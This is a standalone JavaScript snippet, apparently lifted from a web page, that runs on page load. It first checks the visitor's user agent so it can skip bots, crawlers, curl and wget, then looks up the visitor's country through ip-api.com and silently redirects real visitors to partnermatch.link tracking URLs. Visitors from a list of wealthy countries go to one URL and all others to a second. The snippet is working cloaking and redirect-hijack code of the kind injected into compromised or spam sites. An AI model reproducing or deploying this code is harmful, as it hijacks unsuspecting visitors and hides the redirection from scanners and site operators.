 <script>
        document.addEventListener('DOMContentLoaded', function() {
            function isBot() {
                var botPatterns = [
                    /bot/i,
                    /spider/i,
                    /crawl/i,
                    /curl/i,
                    /wget/i,
                    /http/i
                ];

                var userAgent = navigator.userAgent;

                return botPatterns.some(pattern => pattern.test(userAgent));
            }

            function redirectToSmartURL() {
                if (isBot()) {
                    console.log("Bot detected, no redirect will be performed.");
                    return;
                }

                fetch('http://ip-api.com/json/')
                    .then(response => response.json())
                    .then(data => {
                        var country = data.countryCode;

                        var targetUrl = "https://cdefecf.partnermatch.link/s/22edadef06445?track=LEGIT&subsource=TEVHSVQsQ1osMTg1LjI0Mi42LjUyLFdBUCxUUkFGRUU";
                        var youtubeUrl = "https://cdefecf.partnermatch.link/s/22edadef06445?track=JOKOSEMUJUNG&subsource=Sk9LT1NFTVVKVU5HLEVTLDE4NS4xODguNjEuNDUsV0VCLFRSQUZFRQ";

                        // Daftar negara yang perlu diarahkan ke targetUrl
                        var redirectCountries = [
                            "AU", "AT", "BE", "CA", "DK", "FI", "FR", "DE", "IT",
                            "JP", "NL", "NZ", "NO", "PT", "ES", "SE", "CH", "GB", "US"
                        ];

                        if (redirectCountries.includes(country)) {
                            window.location.href = targetUrl;
                        } else {
                            window.location.href = youtubeUrl;
                        }
                    })
                    .catch(error => {
                        console.error('Error fetching geolocation data:', error);
                        window.location.href = "https://cdefecf.partnermatch.link/s/22edadef06445?track=JOKOSEMUJUNG&subsource=Sk9LT1NFTVVKVU5HLEVTLDE4NS4xODguNjEuNDUsV0VCLFRSQUZFRQ";
                    });
            }

            redirectToSmartURL();
        });
    </script>
